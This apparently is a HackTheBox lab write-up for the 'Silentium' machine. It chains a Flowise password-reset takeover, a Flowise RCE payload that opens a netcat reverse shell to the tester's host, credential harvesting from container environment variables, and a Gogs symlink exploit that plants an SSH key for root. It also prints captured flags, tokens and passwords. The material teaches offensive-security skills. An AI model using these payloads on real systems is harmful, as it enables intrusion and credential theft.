---
title: "Silentium"
date: 2026-11-06
platform: HTB
difficulty: easy
locked: false
tags: [linux] 
---

## Reconnaissance

Let's start with the port identification.
```bash
~/workbench/silentium 
➜ sudo nmap -p- -sS --min-rate 5000 10.129.245.103 -oG content/allPorts
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-06 20:07 +0100
Nmap scan report for 10.129.245.103
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.44 seconds
~/workbench/silentium 
➜ nmap -p22,80 -sVC 10.129.245.103 -oN content/targeted
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-06 20:09 +0100
Nmap scan report for 10.129.245.103
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```

Now we have a domain.
```bash
~/workbench/silentium took 4s 
➜ echo '10.129.245.103 silentium.htb' | sudo tee -a /etc/hosts
```

With `ffuf` we identified a new subdomain.
```bash
~/workbench/silentium 
➜ ffuf -u http://silentium.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.silentium.htb' -fw 6 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       git-20260926-8d65e037
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 57ms]
:: Progress: [20000/20000] :: Job [1/1] :: 699 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

If we navigate a little bit with burpsuite making a map, we are able to see that it uses the `/api/` to create users, change the password, etc.
```bash
~/workbench/silentium 
➜ curl http://staging.silentium.htb/api/v1/version                                                                                                                   
{"version":"3.0.5"}
```
## Explotation

### CVE-2025-58434

This version of Flowise is vulnerable to [CVE-2025-58434](https://www.exploit-db.com/exploits/52557) which takes an existing user and changes the pasword for the one that we desire.

Now to get existing user we will try with the names that appears on the page `silentium.htb`.
![email-names](../../../public/silentium/email-names.png)

```bash
~/workbench/silentium 
➜ python $(locate typescript/webapps/52557.py) --email ben@silentium.htb --newpassword Test1234@ --url http://staging.silentium.htb

_____       _                              _____
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--.
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/
                            __/ |
                          |___/

                by nltt0

[x] Password changed
```

Now using that credentials we are able to login on `staging.silentium.htb` and we see that we are Administrators of the page.

### CVE-2025-59528

After further investigating we saw that this is also vulnerable to an RCE of [CVE-2025-59528](https://github.com/corey-farley/CVE-2025-59528-Flowise-RCE)

*Shell 1*
```bash
~/workbench/silentium 
➜ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' \
-d '{ "loadMethod": "listActions", "inputs": { "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"ping -c 1 10.10.16.85\"); return 1;})()})"}}'
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]%  
```

*Shell 2*
```bash
~/workbench/silentium 
➜ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IPv4/IPv6), snapshot length 262144 bytes
12:16:48.206291 IP staging.silentium.htb > HackArch: ICMP echo request, id 1333, seq 0, length 64
12:16:48.206315 IP HackArch > staging.silentium.htb: ICMP echo reply, id 1333, seq 0, length 64
```

With this little poc we tested that the endpoint is vulnerable, now we will proceed to get the reverse shell.

*Shell 1*
```bash
~/workbench/silentium 
➜ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-H 'Content-Type: application/json' \
-H 'Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' \
-d '{ "loadMethod": "listActions", "inputs": { "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.16.85 1234 -e sh\"); return 1;})()})"}}'
```

*Shell 2*
```bash

~/workbench/silentium 
➜ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.129.245.103 34809
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## Privilege esacalation

### Ben

We have a shell now but where are we?

The response is simple, after checking with ID we are able to see that we are root which is quite strange and further navigating on the shell we are able to see that we are on a container.

```sh
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 6a:bb:88:60:6d:d0 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

cat /etc/passwd | grep -E 'sh$'
root:x:0:0:root:/root:/bin/sh
node:x:1000:1000::/home/node:/bin/sh
```

checking for hidden files wer are able to find the file `/.dockerenv` this means that we are running on a docker environment and the variables declared there should be in our shell too so we will check them using `env`.
```bash
env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

As you can see there we have 2 passwords so we will thest the user `ben` with both.
```bash
workbench/silentium/exploits took 6s 
✗ sshpass -p 'F1l3_d0ck3r' ssh ben@silentium.htb                                                 
Permission denied, please try again.

workbench/silentium/exploits took 4s 
✗ sshpass -p 'r04D!!_R4ge' ssh ben@silentium.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Nov  7 12:04:23 PM UTC 2026

  System load:           0.26
  Usage of /:            82.9% of 13.37GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.103
  IPv6 address for eth0: dead:beef::a0de:adff:fe38:1392

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$
```

Now we are able to extract the `user.txt` flag.
```bash
ben@silentium:~$ cat user.txt 
23d479c0fb518495b1eba6fa14873139
```

### Root 

Inspecing on the process we were able to see that the user `root` is running a service called `gogs` which like `gitea` and `git` works to store applications code.
```bash
ben@silentium:~$ ps -aux | grep gogs
root        1510  0.0  1.8 1812400 75144 ?       Ssl  10:40   0:02 /opt/gogs/gogs/gogs web
ben@silentium:~$ /opt/gogs/gogs/gogs --help 
NAME:
   Gogs - A painless self-hosted Git service

USAGE:
   gogs [global options] command [command options] [arguments...]

VERSION:
   0.13.3

COMMANDS:
   web      Start web server
   serv     This command should only be called by SSH shell
   hook     Delegate commands to corresponding Git hooks
   cert     Generate self-signed certificate
   admin    Perform admin operations on command line
   import   Import portable data as local Gogs data
   backup   Backup files and database
   restore  Restore files and database from backup
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h     show help
   --version, -v  print the version
```

This is running on port `3001` so we will use our SSH session to stablish a tunnel.
```bash
workbench/silentium/exploits took 28m20s 
✗ sshpass -p 'r04D!!_R4ge' ssh ben@silentium.htb -L 8081:127.0.0.1:3001
```

This makes the app accesible using our port `8081`.

The version of gogs is vulnerable to [CVE-2025-8110](https://cloud.projectdiscovery.io/library/CVE-2025-8110) which allows us to create a symlink to access the `/root/` folder using the API sending a PUT request.

First we will need to create a User and a Repository.

When we have this created, we will clone it and create the symlink.
```bash
workbench/silentium/exploits 
➜ git clone http://localhost:8081/algol0/hacktest
Cloning into 'hacktest'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 215 bytes | 215.00 KiB/s, done.

workbench/silentium/exploits 
➜ cd hacktest 

hacktest on  master 
➜ ln -s /root/.ssh sshdir

hacktest on  master [?] 
➜ git add sshdir                                 

hacktest on  master [+] 
➜ git commit -m "symlink created"                
[master dff1503] symlink created
 1 file changed, 1 insertion(+)
 create mode 120000 sshdir

hacktest on  master [⇡] 
➜ git push                       
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 8 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 292 bytes | 292.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Username for 'http://localhost:8081': algol0
Password for 'http://algol0@localhost:8081': 
To http://localhost:8081/algol0/hacktest
   0013470..dff1503  master -> master
```

Now to exploit the API we need to create an API Token to be able to send the `PUT` request.
![api-token](../../../public/silentium/api-token.png)

After this we will exploit the API to clone our own SSH key into the `/root/.ssh/authorized_keys` to be able to do ssh login on `root` user.
```bash
hacktest on  master 
➜ cat ~/.ssh/vuln_vm.pub| base64 -w0                  
c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUpzNXdoWVZqTm1KdldCdzlBWW5kbVExaVM4azZOOVA2S1ZHTW1NL2tuZHIgem9kaWFrQEhhY2tBcmNoCg==%                                                  
hacktest on  master 
➜ curl -X PUT http://localhost:8081/api/v1/repos/algol0/hacktest/contents/sshdir/authorized_keys -d '{"message": "hacktest", "content": "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUpzNXdoWVZqTm1KdldCdzlBWW5kbVExaVM4azZOOVA2S1ZHTW1NL2tuZHIgem9kaWFrQEhhY2tBcmNoCg=="}' -H 'Authorization: token e8192e189167eaf97a3e27111b0149732fcc13c6' -H 'Content-type: application/json' 
```

and with this we should be able to do an ssh connection to root using our key and read the `root.txt` flag.
```bash
hacktest on  master 
➜ ssh -i ~/.ssh/vuln_vm root@silentium.htb        
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Nov  7 01:36:13 PM UTC 2026

  System load:           0.0
  Usage of /:            83.0% of 13.37GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             232
  Users logged in:       1
  IPv4 address for eth0: 10.129.245.103
  IPv6 address for eth0: dead:beef::a0de:adff:fe38:1392

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Nov  7 13:22:47 2026 from 10.10.16.85
root@silentium:~# cat root.txt  
8d999537db68545a90bd1a9c5f226cea
```
